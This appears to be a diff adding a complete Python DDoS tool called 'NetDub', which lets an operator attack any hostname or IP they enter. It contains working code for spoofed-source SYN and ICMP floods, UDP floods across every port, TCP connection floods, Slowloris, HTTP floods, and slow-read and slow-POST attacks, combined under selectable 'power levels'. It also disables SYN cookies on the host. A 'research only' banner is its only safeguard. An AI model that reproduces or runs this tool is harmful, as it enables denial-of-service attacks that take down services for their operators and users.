@@ -1,0 +1,409 @@
+#!/usr/bin/env python3
+"""
+NetDub - Final DDoS Testing Suite
+Advanced Multi-Layer DDoS Testing Tool
+For security research and defense testing only
+"""
+
+import socket
+import threading
+import time
+import random
+import struct
+import subprocess
+import os
+import sys
+from multiprocessing import Process, cpu_count
+from colorama import Fore, Style, init
+import requests
+import asyncio
+import aiohttp
+from scapy.all import *
+
+# Initialize
+init()
+
+class NetDub:
+    def __init__(self):
+        self.target_host = None
+        self.target_ip = None
+        self.target_port = 80
+        self.attack_power = 1
+        self.running = False
+        self.processes = []
+        self.threads = []
+        
+        # Check root privileges
+        if os.geteuid() != 0:
+            print(f"{Fore.RED}[!] This tool requires root privileges for maximum performance{Fore.RESET}")
+            print(f"{Fore.YELLOW}[*] Run with: sudo python3 {sys.argv[0]}{Fore.RESET}")
+            sys.exit(1)
+    
+    def banner(self):
+        """Display banner"""
+        print(f"""
+{Fore.RED}╔══════════════════════════════════════════════════════════════╗
+║                          NetDub                              ║
+║                   Final DDoS Testing Suite                   ║
+║                                                              ║
+║              [Layer 3/4/7 Attack Vectors]                   ║
+║                                                              ║
+║  ⚠️  FOR SECURITY RESEARCH AND DEFENSE TESTING ONLY  ⚠️    ║
+╚══════════════════════════════════════════════════════════════╝{Fore.RESET}
+        """)
+    
+    def resolve_target(self, host):
+        """Resolve target hostname to IP"""
+        try:
+            self.target_ip = socket.gethostbyname(host)
+            print(f"{Fore.GREEN}[✓] Target resolved: {host} -> {self.target_ip}{Fore.RESET}")
+            return True
+        except:
+            print(f"{Fore.RED}[✗] Failed to resolve: {host}{Fore.RESET}")
+            return False
+    
+    def optimize_system(self):
+        """Optimize system for high performance attacks"""
+        print(f"{Fore.CYAN}[*] Optimizing system performance...{Fore.RESET}")
+        
+        optimizations = [
+            "echo 1 > /proc/sys/net/ipv4/ip_forward",
+            "echo 0 > /proc/sys/net/ipv4/tcp_syncookies",
+            "echo 65535 > /proc/sys/net/core/somaxconn",
+            "echo 1000000 > /proc/sys/net/core/netdev_max_backlog",
+            "echo 30 > /proc/sys/net/ipv4/tcp_fin_timeout",
+            "echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse",
+            "echo 1 > /proc/sys/net/ipv4/tcp_tw_recycle",
+            "ulimit -n 1000000",
+            "echo 1048576 > /proc/sys/net/core/rmem_max",
+            "echo 1048576 > /proc/sys/net/core/wmem_max"
+        ]
+        
+        for cmd in optimizations:
+            try:
+                subprocess.run(cmd, shell=True, check=True, capture_output=True)
+            except:
+                pass
+        
+        print(f"{Fore.GREEN}[✓] System optimized for maximum performance{Fore.RESET}")
+    
+    def layer3_syn_flood(self):
+        """Layer 3 - SYN Flood Attack"""
+        print(f"{Fore.YELLOW}[*] Launching Layer 3 SYN Flood...{Fore.RESET}")
+        
+        def syn_flood_worker():
+            while self.running:
+                try:
+                    # Create random source IP
+                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                    src_port = random.randint(1024, 65535)
+                    
+                    # Create SYN packet
+                    packet = IP(src=src_ip, dst=self.target_ip) / TCP(sport=src_port, dport=self.target_port, flags="S")
+                    
+                    # Send packet
+                    send(packet, verbose=0)
+                    
+                except Exception as e:
+                    continue
+        
+        # Launch multiple processes
+        for _ in range(cpu_count() * 4):
+            process = Process(target=syn_flood_worker)
+            process.start()
+            self.processes.append(process)
+    
+    def layer3_udp_flood(self):
+        """Layer 3 - UDP Flood Attack"""
+        print(f"{Fore.YELLOW}[*] Launching Layer 3 UDP Flood...{Fore.RESET}")
+        
+        def udp_flood_worker():
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            payload = b"A" * 1024
+            
+            while self.running:
+                try:
+                    for port in range(1, 65536):
+                        if not self.running:
+                            break
+                        sock.sendto(payload, (self.target_ip, port))
+                except:
+                    continue
+        
+        for _ in range(cpu_count() * 8):
+            process = Process(target=udp_flood_worker)
+            process.start()
+            self.processes.append(process)
+    
+    def layer3_icmp_flood(self):
+        """Layer 3 - ICMP Flood Attack"""
+        print(f"{Fore.YELLOW}[*] Launching Layer 3 ICMP Flood...{Fore.RESET}")
+        
+        def icmp_flood_worker():
+            while self.running:
+                try:
+                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                    packet = IP(src=src_ip, dst=self.target_ip) / ICMP()
+                    send(packet, verbose=0)
+                except:
+                    continue
+        
+        for _ in range(cpu_count() * 2):
+            process = Process(target=icmp_flood_worker)
+            process.start()
+            self.processes.append(process)
+    
+    def layer4_tcp_flood(self):
+        """Layer 4 - TCP Connection Flood"""
+        print(f"{Fore.YELLOW}[*] Launching Layer 4 TCP Flood...{Fore.RESET}")
+        
+        def tcp_flood_worker():
+            while self.running:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(0.1)
+                    sock.connect((self.target_ip, self.target_port))
+                    sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\n\r\n")
+                    sock.close()
+                except:
+                    continue
+        
+        for _ in range(cpu_count() * 16):
+            thread = threading.Thread(target=tcp_flood_worker)
+            thread.daemon = True
+            thread.start()
+            self.threads.append(thread)
+    
+    def layer4_slowloris(self):
+        """Layer 4 - Slowloris Attack"""
+        print(f"{Fore.YELLOW}[*] Launching Layer 4 Slowloris...{Fore.RESET}")
+        
+        def slowloris_worker():
+            sockets = []
+            
+            # Create connections
+            for _ in range(1000):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(4)
+                    sock.connect((self.target_ip, self.target_port))
+                    sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
+                    sock.send(f"Host: {self.target_host}\r\n".encode())
+                    sock.send(f"User-Agent: Mozilla/5.0\r\n".encode())
+                    sockets.append(sock)
+                except:
+                    continue
+            
+            # Keep connections alive
+            while self.running:
+                for sock in sockets[:]:
+                    try:
+                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
+                    except:
+                        sockets.remove(sock)
+                time.sleep(15)
+        
+        for _ in range(cpu_count()):
+            thread = threading.Thread(target=slowloris_worker)
+            thread.daemon = True
+            thread.start()
+            self.threads.append(thread)
+    
+    def layer7_http_flood(self):
+        """Layer 7 - HTTP GET/POST Flood"""
+        print(f"{Fore.YELLOW}[*] Launching Layer 7 HTTP Flood...{Fore.RESET}")
+        
+        def http_flood_worker():
+            session = requests.Session()
+            session.headers.update({
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            })
+            
+            while self.running:
+                try:
+                    # GET requests
+                    url = f"http://{self.target_host}/?{random.randint(0, 999999)}"
+                    session.get(url, timeout=1)
+                    
+                    # POST requests
+                    data = {'data': 'A' * 1024}
+                    session.post(f"http://{self.target_host}/", data=data, timeout=1)
+                    
+                except:
+                    continue
+        
+        for _ in range(cpu_count() * 32):
+            thread = threading.Thread(target=http_flood_worker)
+            thread.daemon = True
+            thread.start()
+            self.threads.append(thread)
+    
+    def layer7_slowread(self):
+        """Layer 7 - Slow Read Attack"""
+        print(f"{Fore.YELLOW}[*] Launching Layer 7 Slow Read...{Fore.RESET}")
+        
+        def slowread_worker():
+            while self.running:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.connect((self.target_ip, self.target_port))
+                    sock.send(f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n".encode())
+                    
+                    # Read response slowly
+                    while self.running:
+                        try:
+                            data = sock.recv(1)
+                            if not data:
+                                break
+                            time.sleep(0.1)
+                        except:
+                            break
+                    
+                    sock.close()
+                except:
+                    continue
+        
+        for _ in range(cpu_count() * 4):
+            thread = threading.Thread(target=slowread_worker)
+            thread.daemon = True
+            thread.start()
+            self.threads.append(thread)
+    
+    def layer7_slowpost(self):
+        """Layer 7 - Slow POST Attack"""
+        print(f"{Fore.YELLOW}[*] Launching Layer 7 Slow POST...{Fore.RESET}")
+        
+        def slowpost_worker():
+            while self.running:
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.connect((self.target_ip, self.target_port))
+                    
+                    # Send headers
+                    headers = f"POST / HTTP/1.1\r\nHost: {self.target_host}\r\nContent-Length: 1000000\r\n\r\n"
+                    sock.send(headers.encode())
+                    
+                    # Send data slowly
+                    for i in range(1000000):
+                        if not self.running:
+                            break
+                        sock.send(b"A")
+                        time.sleep(0.01)
+                    
+                    sock.close()
+                except:
+                    continue
+        
+        for _ in range(cpu_count() * 2):
+            thread = threading.Thread(target=slowpost_worker)
+            thread.daemon = True
+            thread.start()
+            self.threads.append(thread)
+    
+    def launch_attack(self, power_level):
+        """Launch attack with specified power level"""
+        attack_methods = {
+            1: [self.layer7_http_flood],  # Light
+            2: [self.layer7_http_flood, self.layer4_tcp_flood],  # Medium
+            3: [self.layer7_http_flood, self.layer4_tcp_flood, self.layer4_slowloris],  # Heavy
+            4: [self.layer7_http_flood, self.layer4_tcp_flood, self.layer4_slowloris, self.layer3_udp_flood],  # Extreme
+            5: [self.layer7_http_flood, self.layer4_tcp_flood, self.layer4_slowloris, 
+                self.layer3_syn_flood, self.layer3_udp_flood, self.layer3_icmp_flood,
+                self.layer7_slowread, self.layer7_slowpost]  # Maximum
+        }
+        
+        methods = attack_methods.get(power_level, attack_methods[5])
+        
+        print(f"{Fore.RED}[!] LAUNCHING ATTACK LEVEL {power_level} - {len(methods)} VECTORS{Fore.RESET}")
+        print(f"{Fore.RED}[!] TARGET: {self.target_host} ({self.target_ip}:{self.target_port}){Fore.RESET}")
+        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop the attack{Fore.RESET}")
+        print()
+        
+        self.running = True
+        
+        # Launch all attack methods
+        for method in methods:
+            method()
+            time.sleep(0.5)
+        
+        # Monitor attack
+        try:
+            while self.running:
+                print(f"{Fore.BLUE}[⏳] Attack in progress... Processes: {len(self.processes)} | Threads: {len(self.threads)}{Fore.RESET}")
+                time.sleep(10)
+        except KeyboardInterrupt:
+            print(f"\n{Fore.RED}[!] Stopping attack...{Fore.RESET}")
+            self.stop_attack()
+    
+    def stop_attack(self):
+        """Stop all attack processes and threads"""
+        self.running = False
+        
+        # Stop processes
+        for process in self.processes:
+            try:
+                process.terminate()
+                process.join(timeout=1)
+                if process.is_alive():
+                    process.kill()
+            except:
+                pass
+        
+        # Threads will stop automatically when self.running = False
+        
+        print(f"{Fore.GREEN}[✓] Attack stopped successfully{Fore.RESET}")
+    
+    def run(self):
+        """Main function"""
+        self.banner()
+        
+        try:
+            # Get target
+            self.target_host = input(f"{Fore.GREEN}🌐 Enter target (domain/IP): {Fore.RESET}").strip()
+            if not self.target_host:
+                print(f"{Fore.RED}[!] Target is required{Fore.RESET}")
+                return
+            
+            # Resolve target
+            if not self.resolve_target(self.target_host):
+                return
+            
+            # Get port
+            try:
+                port_input = input(f"{Fore.GREEN}🔌 Enter port (default: 80): {Fore.RESET}").strip()
+                if port_input:
+                    self.target_port = int(port_input)
+            except:
+                self.target_port = 80
+            
+            # Get attack power
+            print(f"\n{Fore.CYAN}Attack Power Levels:{Fore.RESET}")
+            print(f"{Fore.GREEN}1{Fore.RESET} - Light (Layer 7 HTTP)")
+            print(f"{Fore.YELLOW}2{Fore.RESET} - Medium (Layer 4 + 7)")
+            print(f"{Fore.MAGENTA}3{Fore.RESET} - Heavy (Multi-layer)")
+            print(f"{Fore.RED}4{Fore.RESET} - Extreme (Layer 3 + 4 + 7)")
+            print(f"{Fore.RED}5{Fore.RESET} - Maximum (All vectors)")
+            
+            try:
+                power = int(input(f"{Fore.GREEN}⚡ Select power level (1-5): {Fore.RESET}").strip())
+                if power not in range(1, 6):
+                    power = 3
+            except:
+                power = 3
+            
+            # Optimize system
+            self.optimize_system()
+            
+            # Launch attack
+            self.launch_attack(power)
+            
+        except KeyboardInterrupt:
+            print(f"\n{Fore.RED}[!] Program interrupted by user{Fore.RESET}")
+        except Exception as e:
+            print(f"{Fore.RED}[!] Error: {e}{Fore.RESET}")
+        finally:
+            self.stop_attack()
+
+if __name__ == "__main__":
+    netdub = NetDub()
+    netdub.run()
